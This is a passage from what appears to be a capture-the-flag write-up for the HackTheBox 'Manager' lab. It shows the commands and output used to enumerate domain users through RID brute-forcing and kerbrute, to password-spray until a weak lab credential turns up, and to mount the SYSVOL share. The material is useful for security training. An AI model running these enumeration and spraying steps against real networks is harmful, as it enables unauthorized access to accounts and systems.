With a null session we can't see anything in the shares, but with crackmapexec we bruteforce the users

```bash
┌──(kali㉿kali)-[~]
└─$ crackmapexec smb manager.htb -u anonymous -p '' --rid-brute
SMB         manager.htb     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         manager.htb     445    DC01             [+] manager.htb\anonymous: 
SMB         manager.htb     445    DC01             [+] Brute forcing RIDs
SMB         manager.htb     445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         manager.htb     445    DC01             500: MANAGER\Administrator (SidTypeUser)
SMB         manager.htb     445    DC01             501: MANAGER\Guest (SidTypeUser)
SMB         manager.htb     445    DC01             502: MANAGER\krbtgt (SidTypeUser)
SMB         manager.htb     445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
SMB         manager.htb     445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
SMB         manager.htb     445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
SMB         manager.htb     445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
SMB         manager.htb     445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
SMB         manager.htb     445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
SMB         manager.htb     445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
SMB         manager.htb     445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
SMB         manager.htb     445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
SMB         manager.htb     445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
SMB         manager.htb     445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
SMB         manager.htb     445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
SMB         manager.htb     445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
SMB         manager.htb     445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
SMB         manager.htb     445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
SMB         manager.htb     445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         manager.htb     445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
SMB         manager.htb     445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
SMB         manager.htb     445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
SMB         manager.htb     445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
SMB         manager.htb     445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB         manager.htb     445    DC01             1113: MANAGER\Zhong (SidTypeUser)
SMB         manager.htb     445    DC01             1114: MANAGER\Cheng (SidTypeUser)
SMB         manager.htb     445    DC01             1115: MANAGER\Ryan (SidTypeUser)
SMB         manager.htb     445    DC01             1116: MANAGER\Raven (SidTypeUser)
SMB         manager.htb     445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
SMB         manager.htb     445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
SMB         manager.htb     445    DC01             1119: MANAGER\Operator (SidTypeUser)
```

So we got a list of users, now we can bruteforce some services like MSSQL

We could have got the users by brute forcing kerberos as the following command

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Manager-10.10.11.236]
└─$ kerbrute userenum -d manager.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.11.236
  
ryan  
cheng  
raven  
guest  
administrator  
operator  
jinwoo  
zhong  
chinhaw
```

Now we try to guess some password and it was easy, operator has a really insecure one

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Manager-10.10.11.236]
└─$ crackmapexec smb 10.10.11.236 -u users.txt -p users.txt --no-brute
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [-] manager.htb\zhong:zhong STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\cheng:cheng STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:ryan STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:raven STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\jinWoo:jinWoo STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\chinHae:chinHae STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator
```

Now we can see the smb shares

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Manager-10.10.11.236]
└─$ smbmap -u 'operator' -p 'operator' -H 10.10.11.236
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                

[+] IP: 10.10.11.236:445        Name: manager.htb               Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share

┌──(kali㉿kali)-[~/Documents/Boxes/Manager-10.10.11.236]
└─$ smbclient -U 'operator' --password='operator' //10.10.11.236/SYSVOL
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Jul 27 12:19:07 2023
  ..                                  D        0  Thu Jul 27 12:19:07 2023
  manager.htb                        Dr        0  Thu Jul 27 12:19:07 2023

                5446399 blocks of size 4096. 695584 blocks available
smb: \>
```

Here we find a backup so lets mount in our drive and inspect the folders

```bash
┌──(kali㉿kali)-[~]
└─$ sudo mount -t cifs //10.10.11.236/SYSVOL /mnt -o user='operator',password='operator'

┌──(kali㉿kali)-[~]
└─$ cd /mnt                                

┌──(kali㉿kali)-[/mnt]
└─$ tree .         
.
└── manager.htb
    ├── DfsrPrivate
    ├── Policies
    │   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
    │   │   ├── GPT.INI
    │   │   ├── MACHINE
    │   │   │   ├── Microsoft
    │   │   │   │   └── Windows NT
    │   │   │   │       └── SecEdit
    │   │   │   │           └── GptTmpl.inf
    │   │   │   ├── Registry.pol
    │   │   │   └── Scripts
    │   │   │       ├── Shutdown
    │   │   │       └── Startup
    │   │   └── USER
    │   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
    │       ├── GPT.INI
    │       ├── MACHINE
    │       │   └── Microsoft
    │       │       └── Windows NT
    │       │           └── SecEdit
    │       │               └── GptTmpl.inf
    │       └── USER
    └── scripts

20 directories, 5 files
```

Here only seems interesting the file Registry.pol but after see the strings (`strings Registry.pol`) we didn't find anything. Lets dig in MSSQL